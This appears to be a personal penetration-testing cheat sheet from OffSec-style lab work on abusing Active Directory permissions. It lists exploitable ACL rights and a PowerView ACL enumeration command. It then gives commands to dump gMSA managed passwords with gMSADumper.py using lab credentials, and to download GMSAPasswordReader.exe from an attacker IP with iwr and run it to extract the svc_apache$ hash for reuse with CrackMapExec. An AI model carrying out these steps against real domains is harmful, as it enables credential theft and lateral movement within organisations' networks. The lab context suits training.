#enumerations 

```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```


1. Understand the rights
```
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104(stephanie)
ActiveDirectoryRights  : ReadProperty
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553(This is the one that has ReadProperty right over stephanie)
```

2. Enumerate the other groups/Users

```powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

3. If you find GMSA

- svc_apache is the member of gMSA
```powershell

Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames

```

#### To dump
🔴 The rc4_hmac hash is the same as the NT hash, they are interchangeable.
##### Linux

```bash
python gMSADumper.py -u 'enox' -p 'california' -l 192.168.248.165 -d heist.offsec 
```

##### Windows

```powershell
iwr -uri http://192.168.45.156/GMSAPasswordReader.exe  -o gmsa.exe
```

```powershell
.\gmsa.exe --accountname 'svc_apache$' 
```
 then [[CrackMapExec]]
 